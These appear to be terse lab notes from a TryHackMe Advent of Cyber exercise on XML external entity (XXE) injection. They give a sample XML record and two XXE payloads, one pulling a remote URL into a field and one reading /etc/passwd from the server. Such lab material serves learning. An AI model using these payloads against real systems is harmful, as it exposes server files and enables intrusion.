# Title : SOC-mas XX-what-ee?
steps:
create xml file put this code:
```xml
<people> 
	<name>Glitch</name> 
	<address>Wareville</address> 
	<email>glitch@wareville.com</email> 
	<phone>111000</phone> 
</people>
<!DOCTYPE people [
   <!ELEMENT people(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>
   <!ELEMENT address (#PCDATA)>
   <!ELEMENT email (#PCDATA)>
   <!ELEMENT phone (#PCDATA)>
]>
<!DOCTYPE people [ 
<!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt"> ]> 
<people> 
	<name>Glitch</name> 
	<address>&ext;</address> 
	<email>glitch@wareville.com</email> 
	<phone>111000</phone> 
</people>

<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```


#AOC 